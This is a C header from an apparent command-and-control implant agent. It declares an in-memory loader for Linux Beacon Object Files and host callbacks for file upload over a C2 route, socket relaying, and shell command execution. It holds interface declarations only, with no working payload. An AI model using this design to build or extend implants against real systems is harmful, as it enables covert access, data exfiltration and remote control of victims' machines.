#ifndef C2_BOF_H
#define C2_BOF_H

/*
 * bof.h — Linux BOF (Beacon Object File) execution.
 *
 * The loader itself is not linked into the agent: it is the `coffloader_linux`
 * dependency module (coffloader_linux.so), the Linux counterpart of the Windows
 * COFFLoader DLL. c2_bof_run maps the loader image from memory with elfload,
 * calls its `Run` export with the object and packed arguments, and unmaps
 * it again.
 *
 * The Go agent maps the same dependency with memmod (core/lib/coffloader), so
 * both agents execute BOFs through identical loader code.
 */

#include "common.h"

#ifdef __cplusplus
extern "C" {
#endif

/*
 * Pack BOF arguments into the Beacon wire format consumed by the loader:
 *
 *   uint32(body_len) || value...
 *
 * Each `args[i]` is a prefixed token, mirroring Go's
 *PackCoffArgs/packLinuxArgs:
 *   i<int32>   s<int16>   z<string>   Z<wide string>   b<hex bytes>
 *
 * Returns C2_OK and sets *out_len, or C2_ERR_ARG/C2_ERR_NOMEM.
 */
c2_status c2_bof_pack_args(const c2_str *args, size_t argc, uint8_t *out,
                           size_t out_cap, size_t *out_len);

/*
 * Host primitives a BOF reaches through the loader's Beacon compatibility
 * layer. Each returns 0 on success and a negative status on failure.
 */
typedef int (*c2_bof_read_fn)(void *ctx, const char *path, uint8_t **out,
                              size_t *len, char *err, int err_cap);
typedef int (*c2_bof_write_fn)(void *ctx, const char *path, const uint8_t *data,
                               size_t len, char *err, int err_cap);
/* Upload the file at `path` (a memfs key or a disk path) from `offset` on,
 * over the FTP route named by `token`. The agent streams it, so the BOF never
 * holds the file in memory. */
typedef int (*c2_bof_upload_fn)(void *ctx, const char *token, const char *path,
                                unsigned long offset, char *err, int err_cap);
typedef int (*c2_bof_sha256_fn)(void *ctx, const uint8_t *data, size_t len,
                                char *hex, size_t hex_cap, char *err,
                                int err_cap);
/* Pipe an already-connected socket to the C2 stream named by `token`.
 *
 * The primitive owns nothing but the transport: the BOF parses its arguments,
 * resolves and dials the endpoint, and reports its own errors. It takes
 * ownership of `fd` and returns as soon as the relay is running; the agent then
 * closes both ends when either side finishes or the relay has been idle for
 * `idle_seconds`. The relay runs on an agent thread because the loader unmaps a
 * BOF object once its entry point returns, and the RV32 guest is single
 * threaded. */
typedef int (*c2_bof_relay_fn)(void *ctx, const char *token, int fd,
                               int idle_seconds, char *err, int err_cap);
/* Run `cmd` and capture its combined output.
 *
 * `shell` selects the execution model: non-zero runs `cmd` through `/bin/sh
 * -c`, zero splits `cmd` into words (quotes and backslashes, no expansion) and
 * executes the first word directly. The call is synchronous: the agent's
 * message loop waits for the process, as it does for the other host
 * primitives. It returns when the process exits, when its output fills `out`,
 * or when the agent-side deadline expires; the output is NUL terminated at
 * `out[ret]`. Returns the number of bytes written, or a negative status. */
typedef int (*c2_bof_exec_fn)(void *ctx, const char *cmd, int shell, char *out,
                              size_t out_cap, char *err, int err_cap);

typedef struct {
  void *ctx;
  c2_bof_read_fn read;
  c2_bof_write_fn write;
  c2_bof_upload_fn upload;
  c2_bof_sha256_fn sha256;
  c2_bof_relay_fn relay;
  c2_bof_exec_fn exec;
} c2_bof_host;

/*
 * Run a Linux relocatable BOF. `loader_so` is the coffloader_linux.so image,
 * `bof` the relocatable object, `export_name` the entry (NULL/"" means "go"),
 * `args`/`args_len` the packed argument blob (may be NULL/0), and `host` the
 * optional host bridge installed before the entry runs.
 *
 * On C2_OK *out is a NUL-terminated malloc'd string (possibly empty) that the
 * caller frees with free(); it is never NULL on C2_OK. On failure *out is set
 * to a malloc'd copy of the loader's error message when one is available
 * (otherwise NULL), and the caller should still free it.
 */
c2_status c2_bof_run(const uint8_t *loader_so, size_t loader_len,
                     const uint8_t *bof, size_t bof_len,
                     const char *export_name, const uint8_t *args,
                     size_t args_len, const c2_bof_host *host, char **out);

#ifdef __cplusplus
}
#endif

#endif /* C2_BOF_H */
